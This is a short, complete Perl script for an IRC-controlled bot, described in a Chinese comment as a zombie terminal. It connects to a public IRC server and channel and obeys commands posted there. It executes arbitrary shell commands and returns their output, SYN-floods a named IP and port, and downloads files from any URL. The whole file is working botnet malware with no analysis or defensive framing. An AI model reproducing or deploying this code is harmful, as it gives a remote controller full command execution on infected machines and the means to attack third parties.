#!/usr/bin/perl -w
use warnings;
use Socket;
use Net::Ping;
use LWP::Simple;
package MyBot;
use base qw( Bot::BasicBot );

$file='bot.conf';        #僵尸终端配置文件
$con_times=100;          #SYN连接次数


if(-e $file){
	open(CONFFILE,"$file");
	@conf=<CONFFILE>;
	chomp(@conf);
	($server, $port, $channels)=@conf;
	close(CONFFILE);
}else{
	$server='irc.chinairc.net';
	$port='6667';
	$channels='#chinese';
}

=head
print "SERVER is $server.\n";
print "PORT is $port.\n";
print "CHANNELS is $channels.\n";
=cut


sub cmd($){
	my $cmd=shift;
	return sprintf(`$cmd`) || return "I cannot do that!";
}


sub synflood($$){
	my ($target_ip,$target_port)=@_;
	for(my $num=1;$num<=$con_times;$num++){
		my $syn=Net::Ping->new("syn");
		$syn->{port_num}=$target_port;
		$syn->ping($target_ip);
		$syn->ack;
		$syn->close;
	}
	return "Yes, Sir!";
}


sub getdown($){
	my $url=shift;
	$url=~/(.*)\/(.*)$/;
	my $filename=$2;
	#print "$filename\n";
	my $result=LWP::Simple::getstore($url, $filename);
	#print "$result\n";
	if($result==200){
		return "I got it!";
	}else{
		return "Sorry, I cannot got it!";
	}
}


sub runorder($){
	my $command=shift;
	if($command=~/^CMD (.*)/){
		return &cmd($1);
	}else{
		if($command=~/^SYN (.*) (.*)/){
			return &synflood($1,$2);
		}else{
			if($command=~/^GET (.*)/){
				return &getdown($1);
			}else{
				return "I cannot catch your meaning!";
			}
		}
	}
}
	

sub said {
	my ($self, $message) = @_;
	$order=$message->{body};
	return &runorder($order);
}


sub help { "I'm annoying, and do nothing useful." }


MyBot->new(
	server => "$server",
	port => "$port",
	channels => "$channels",
	nick => "bot".int(rand(10)).int(rand(10)).int(rand(10)).int(rand(10)).int(rand(10)).int(rand(10))
)->run();